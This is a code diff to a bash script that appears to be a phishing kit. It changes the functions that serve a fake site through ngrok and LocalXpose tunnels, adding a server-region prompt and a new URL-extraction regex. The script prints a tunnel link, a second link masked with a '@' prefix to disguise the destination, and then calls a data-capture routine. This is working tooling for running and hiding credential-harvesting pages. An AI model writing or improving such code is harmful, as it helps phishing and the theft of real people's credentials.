@@ -409,12 +409,20 @@ capture_data() {
 start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	echo -e "\n"
+	read -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	opinion=${opinion:=N}
+	if [[ ${opinion::1} == "y" || ${opinion::1} == "Y" ]]; then 
+		ngrok_region="eu" # eu, au, ap, sa, jp, in
+	else
+		ngrok_region="us"
+	fi
+	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
+        sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
     else
-        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
+        sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
     fi
 
 	{ sleep 8; clear; banner_small; }
@@ -451,16 +459,24 @@ start_cloudflared() {
 start_loclx() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+	echo -e "\n"
+	read -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	opinion=${opinion:=N}
+	if [[ ${opinion::1} == "y" || ${opinion::1} == "Y" ]]; then 
+		loclx_region="eu" # ap / eu
+	else
+		loclx_region="us"
+	fi
+	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/loclx tunnel H -t "$HOST":"$PORT" --https-redirect > .server/.loclx 2>&1 &
+        sleep 2 && termux-chroot ./.server/loclx tunnel http --region ${loclx_region} -t "$HOST":"$PORT" --https-redirect > .server/.loclx 2>&1 &
     else
-        sleep 2 && ./.server/loclx tunnel H -t "$HOST":"$PORT" --https-redirect > .server/.loclx 2>&1 &
+        sleep 2 && ./.server/loclx tunnel http --region ${loclx_region} -t "$HOST":"$PORT" --https-redirect > .server/.loclx 2>&1 &
     fi
 
 	{ sleep 12; clear; banner_small; }
-	loclx_url=$(cat .server/.loclx | grep -o '[-0-9a-z]*\.loclx.io')
+	loclx_url=$(cat .server/.loclx | grep -Eo '[-0-9a-z]+.[-0-9a-z]+(.loclx.io)') # Somebody fix this crappy regex :(
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
 	capture_data
